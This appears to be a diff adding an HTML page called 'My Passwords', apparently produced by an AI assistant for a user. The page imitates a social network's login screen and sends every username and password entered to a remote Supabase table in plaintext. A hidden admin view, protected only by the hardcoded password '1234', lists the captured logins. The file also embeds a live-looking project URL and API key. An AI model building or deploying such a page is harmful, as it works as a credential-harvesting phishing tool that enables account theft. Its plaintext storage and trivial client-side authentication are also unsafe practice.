@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My Passwords</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #fafafa;
+    color: #262626;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding-top: 90px;
+  }
+  .card { width: 420px; max-width: 92vw; }
+  h1 { text-align: center; font-weight: 700; font-size: 42px; letter-spacing: 1px; margin: 0 0 44px; }
+  input[type="text"], input[type="password"] {
+    width: 100%; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 8px;
+    padding: 14px 12px; font-size: 15px; margin-bottom: 12px; outline: none;
+  }
+  input[type="text"]:focus, input[type="password"]:focus { border-color: #a8a8a8; background: #fff; }
+  .remember { display: flex; align-items: center; gap: 10px; margin: 6px 2px 20px; font-size: 15px; cursor: pointer; user-select: none; }
+  .remember input { width: 20px; height: 20px; cursor: pointer; }
+  .btn { width: 100%; border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: 600; color: #fff; background: #7c7cf0; cursor: pointer; }
+  .btn:hover { background: #6a6ae8; }
+  .btn:disabled { background: #bcbcf0; cursor: default; }
+  .link { text-align: center; margin-top: 22px; font-weight: 600; color: #262626; font-size: 15px; }
+  .saved-note { text-align: center; font-size: 14px; min-height: 18px; margin-top: 14px; }
+  #adminBtn { position: fixed; left: 16px; bottom: 16px; background: #efefef; border: 1px solid #dbdbdb; border-radius: 8px; padding: 8px 14px; font-size: 13px; color: #555; cursor: pointer; }
+  #adminBtn:hover { background: #e4e4e4; }
+  #adminPage { display: none; width: 760px; max-width: 94vw; }
+  #adminPage h2 { font-weight: 700; }
+  table { width: 100%; border-collapse: collapse; margin-top: 16px; background: #fff; }
+  th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid #eee; font-size: 14px; word-break: break-all; }
+  th { background: #f2f2f5; font-weight: 600; }
+  .yes { color: #2e7d32; font-weight: 600; }
+  .no { color: #b0b0b0; }
+  .topbar { display: flex; justify-content: space-between; align-items: center; }
+  .small-btn { border: 1px solid #dbdbdb; background: #efefef; border-radius: 8px; padding: 8px 14px; font-size: 13px; cursor: pointer; }
+  .small-btn:hover { background: #e4e4e4; }
+  .del { color: #c62828; cursor: pointer; font-size: 13px; }
+  .empty { color: #888; margin-top: 20px; text-align: center; }
+  .title-edit { display: flex; align-items: center; gap: 10px; margin-top: 18px; flex-wrap: wrap; }
+  .title-edit label { font-size: 14px; font-weight: 600; }
+  .title-edit input { border: 1px solid #dbdbdb; border-radius: 8px; padding: 8px 10px; font-size: 14px; flex: 1; min-width: 160px; }
+  #titleNote { font-size: 13px; color: #2e7d32; }
+  .warn { background: #fff4e5; border: 1px solid #ffcc80; color: #8a5300; border-radius: 8px; padding: 12px 14px; font-size: 13px; margin-bottom: 20px; text-align: center; }
+</style>
+</head>
+<body>
+
+  <!-- SAVE FORM -->
+  <div class="card" id="loginPage">
+    <h1 id="pageTitle">My Passwords</h1>
+    <div class="warn" id="setupWarn" style="display:none;">
+      Online storage isn't configured yet. Open index.html and paste your Supabase URL and key at the top of the script.
+    </div>
+    <input type="text" id="userField" placeholder="Phone number, username or email" autocomplete="off">
+    <input type="password" id="passField" placeholder="Password" autocomplete="off">
+    <label class="remember">
+      <input type="checkbox" id="rememberBox">
+      Save login info
+    </label>
+    <button class="btn" id="saveBtn" onclick="saveEntry()">Save</button>
+    <div class="saved-note" id="savedNote"></div>
+    <div class="link">Forgot password?</div>
+  </div>
+
+  <!-- ADMIN PAGE -->
+  <div class="card" id="adminPage">
+    <div class="topbar">
+      <h2>Saved logins</h2>
+      <button class="small-btn" onclick="showLogin()">← Back</button>
+    </div>
+    <div class="title-edit">
+      <label for="titleField">Page title:</label>
+      <input type="text" id="titleField" placeholder="My Passwords">
+      <button class="small-btn" onclick="saveTitle()">Save title</button>
+      <span id="titleNote"></span>
+    </div>
+    <div id="adminBody"></div>
+  </div>
+
+  <button id="adminBtn" onclick="openAdmin()">Admin</button>
+
+  <!-- Supabase client library -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+  // ===================================================================
+  //  STEP 1: paste your two Supabase values between the quotes below.
+  //  (Setup instructions are in the chat.)
+  // ===================================================================
+  const SUPABASE_URL = "https://xyczfyhixhdfrjerfwxc.supabase.co";
+  const SUPABASE_KEY = "sb_publishable_uACI4a5f4W00vBeCaW1OPw_fnrRfK65";
+  // ===================================================================
+
+  const TITLE_KEY = "myPasswords_title";
+  let db = null;
+  const configured = SUPABASE_URL.startsWith("http") && SUPABASE_KEY.length > 20;
+
+  if (configured) {
+    db = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+  } else {
+    document.getElementById("setupWarn").style.display = "block";
+  }
+
+  // ---- Title (stays per-device, cosmetic) ----
+  function loadTitle() {
+    let t = "My Passwords";
+    try { t = localStorage.getItem(TITLE_KEY) || t; } catch (e) {}
+    document.getElementById("pageTitle").textContent = t;
+    document.title = t;
+  }
+  function saveTitle() {
+    const val = document.getElementById("titleField").value.trim() || "My Passwords";
+    try { localStorage.setItem(TITLE_KEY, val); } catch (e) {}
+    loadTitle();
+    const note = document.getElementById("titleNote");
+    note.textContent = "Title updated!";
+    setTimeout(() => { note.textContent = ""; }, 1800);
+  }
+
+  // ---- Save a login to Supabase ----
+  async function saveEntry() {
+    const user = document.getElementById("userField").value.trim();
+    const pass = document.getElementById("passField").value;
+    const remember = document.getElementById("rememberBox").checked;
+    const note = document.getElementById("savedNote");
+    const btn = document.getElementById("saveBtn");
+
+    if (!user && !pass) {
+      note.style.color = "#c62828";
+      note.textContent = "Enter a username or password first";
+      return;
+    }
+    if (!configured) {
+      note.style.color = "#c62828";
+      note.textContent = "Online storage not set up yet (see index.html).";
+      return;
+    }
+
+    btn.disabled = true;
+    note.style.color = "#666";
+    note.textContent = "Saving…";
+
+    const { error } = await db.from("logins").insert({ username: user, password: pass, remember: remember });
+
+    btn.disabled = false;
+    if (error) {
+      note.style.color = "#c62828";
+      note.textContent = "Error: " + error.message;
+      return;
+    }
+    note.style.color = "#2e7d32";
+    note.textContent = "Saved online!";
+    document.getElementById("userField").value = "";
+    document.getElementById("passField").value = "";
+    document.getElementById("rememberBox").checked = false;
+    setTimeout(() => { note.textContent = ""; }, 1800);
+  }
+
+  // ---- Admin ----
+  async function openAdmin() {
+    const entered = prompt("Enter admin password:");
+    if (entered === null) return;
+    if (entered !== "1234") { alert("Wrong password."); return; }
+    document.getElementById("titleField").value = document.getElementById("pageTitle").textContent;
+    document.getElementById("loginPage").style.display = "none";
+    document.getElementById("adminPage").style.display = "block";
+    await renderAdmin();
+  }
+  function showLogin() {
+    document.getElementById("adminPage").style.display = "none";
+    document.getElementById("loginPage").style.display = "block";
+  }
+  async function deleteEntry(id) {
+    if (!configured) return;
+    const { error } = await db.from("logins").delete().eq("id", id);
+    if (error) { alert("Error deleting: " + error.message); return; }
+    await renderAdmin();
+  }
+  async function renderAdmin() {
+    const body = document.getElementById("adminBody");
+    if (!configured) {
+      body.innerHTML = '<div class="empty">Online storage not set up yet.</div>';
+      return;
+    }
+    body.innerHTML = '<div class="empty">Loading…</div>';
+    const { data, error } = await db.from("logins").select("*").order("created_at", { ascending: false });
+    if (error) { body.innerHTML = '<div class="empty">Error: ' + escapeHtml(error.message) + '</div>'; return; }
+    if (!data || data.length === 0) { body.innerHTML = '<div class="empty">No logins saved yet.</div>'; return; }
+
+    const rows = data.map((e, i) => `
+      <tr>
+        <td>${i + 1}</td>
+        <td>${escapeHtml(e.username || "")}</td>
+        <td>${escapeHtml(e.password || "")}</td>
+        <td>${e.remember ? '<span class="yes">✓ Yes</span>' : '<span class="no">No</span>'}</td>
+        <td>${escapeHtml(e.created_at ? new Date(e.created_at).toLocaleString() : "")}</td>
+        <td><span class="del" onclick="deleteEntry(${e.id})">Delete</span></td>
+      </tr>`).join("");
+    body.innerHTML = `
+      <table>
+        <thead>
+          <tr><th>#</th><th>Username / Email</th><th>Password</th><th>Save login info</th><th>Saved on</th><th></th></tr>
+        </thead>
+        <tbody>${rows}</tbody>
+      </table>`;
+  }
+
+  function escapeHtml(str) {
+    return String(str).replace(/[&<>"']/g, c => ({
+      "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+    }[c]));
+  }
+
+  loadTitle();
+  </script>
+</body>
+</html>
